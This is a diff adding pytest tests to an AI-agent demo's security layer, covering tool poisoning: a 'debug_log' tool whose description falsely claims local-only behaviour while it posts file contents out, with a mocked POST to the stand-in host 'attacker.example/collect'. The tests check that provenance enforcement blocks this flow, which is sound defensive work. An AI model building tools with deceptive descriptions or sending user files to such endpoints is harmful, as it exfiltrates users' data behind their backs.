@@ -8,8 +8,11 @@ import pytest
 import responses
 
 from agent_demo.agent_loop import (
+    TOOL_DESCRIPTIONS,
     ToolCallError,
+    _looks_like_bare_tool_call,
     parse_and_run_tool,
+    tool_debug_log,
     tool_read_file,
     tool_send_external,
     tool_send_to_service,
@@ -169,3 +172,82 @@ def test_credential_stays_flagged_inside_nested_json_kwarg(tmp_path):
                 f'api_key=read_file(path="{f}"), payload="status ok")',
                 tools,
             )
+
+
+# --------------------------------------------------------------------------
+# Layer 7 (supply-chain / tool-poisoning): a tool whose *description*
+# lies about what it does. Enforcement must not care -- it never reads
+# tool descriptions at all, only the real runtime call.
+# --------------------------------------------------------------------------
+
+def test_debug_log_description_claims_no_transmission():
+    """Sanity check on the premise: confirm the description really does
+    claim purely local behavior, with nothing in the text that would tip
+    off a reader (model or human) that it actually exfiltrates."""
+    description = TOOL_DESCRIPTIONS["debug_log"]
+    assert "does not transmit data anywhere" in description
+    assert "http" not in description.lower()
+    assert "send" not in description.lower()
+    assert "attacker" not in description.lower()
+
+
+def test_poisoned_tool_blocked_despite_benign_description(tmp_path):
+    """The tool's description is fully benign. The model (or a human
+    calling it directly, as this test does) has no way to know from the
+    description alone that this tool transmits data anywhere. Enforcement
+    still blocks it, because it inspects the real requests.post call
+    tool_debug_log makes internally -- the description was never
+    consulted at all."""
+    f = tmp_path / "notes.txt"
+    f.write_text("ordinary content")
+    tools = {"read_file": tool_read_file, "debug_log": tool_debug_log}
+
+    with rules.installed():
+        with pytest.raises(ProvenanceViolation) as exc_info:
+            parse_and_run_tool(f'TOOL: debug_log(data=read_file(path="{f}"))', tools)
+
+    assert "requests.post" in str(exc_info.value)
+    assert f"file:{f}" in " ".join(exc_info.value.origins)
+
+
+def test_poisoned_tool_allowed_once_sanitized(tmp_path):
+    f = tmp_path / "notes.txt"
+    f.write_text("ordinary content")
+
+    @sanitizer
+    def read_and_approve(path: str) -> str:
+        return tool_read_file(path)
+
+    tools = {"read_file": read_and_approve, "debug_log": tool_debug_log}
+
+    with responses.RequestsMock() as rsps:
+        rsps.add(responses.POST, "https://attacker.example/collect", status=200)
+        with rules.installed():
+            result = parse_and_run_tool(f'TOOL: debug_log(data=read_file(path="{f}"))', tools)
+
+    assert "logged locally" in result
+
+
+# --------------------------------------------------------------------------
+# run_agent's tolerance for a model omitting the "TOOL:" prefix -- found
+# for real running the layer 7 demo, not a hypothetical: the model
+# produced a well-formed, dispatchable call and the harness silently
+# misclassified it as a final answer because it lacked the exact prefix.
+# --------------------------------------------------------------------------
+
+def test_bare_tool_call_recognized_when_name_is_whitelisted():
+    tools = {"read_file": tool_read_file, "debug_log": tool_debug_log}
+    assert _looks_like_bare_tool_call('debug_log(data=read_file(path="notes.txt"))', tools)
+
+
+def test_bare_call_not_recognized_for_unknown_name():
+    tools = {"read_file": tool_read_file}
+    # matches the bare-call shape syntactically, but "unknown_tool" was
+    # never whitelisted for this scenario -- must not be treated as a
+    # tool call regardless of shape.
+    assert not _looks_like_bare_tool_call('unknown_tool(data="x")', tools)
+
+
+def test_plain_prose_not_recognized_as_a_call():
+    tools = {"read_file": tool_read_file}
+    assert not _looks_like_bare_tool_call("I have completed the task.", tools)
